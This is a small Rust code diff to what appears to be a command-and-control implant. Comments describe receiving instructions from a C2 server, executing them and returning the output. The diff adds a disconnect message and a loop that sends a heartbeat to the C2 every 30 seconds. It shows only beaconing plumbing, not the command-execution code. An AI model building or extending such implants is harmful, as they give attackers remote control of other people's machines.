@@ -40,6 +40,7 @@ pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
         match reader.read_until(b'\n', &mut buffer) {
             Ok(bytes_read) => {
                 if bytes_read == 0 {
+                    println!("Connection lost!!");
                     break;
                 }
 
@@ -79,5 +80,16 @@ pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
     Ok(())
     // Listen for new command/instruction from C2
     // Call function received_instruction - executes the instruction + sends the output to C2
+}
+
+pub fn send_heartbeat_loop(stream: &mut TcpStream) {
+    loop {
+        let heartbeat_message = "heartbeat\n"; // Define your heartbeat message
+        if let Err(e) = stream.write_all(heartbeat_message.as_bytes()) {
+            println!("[E] Failed to send heartbeat: {}", e);
+            break;
+        }
+        std::thread::sleep(std::time::Duration::from_secs(30));
+    }
 }
 
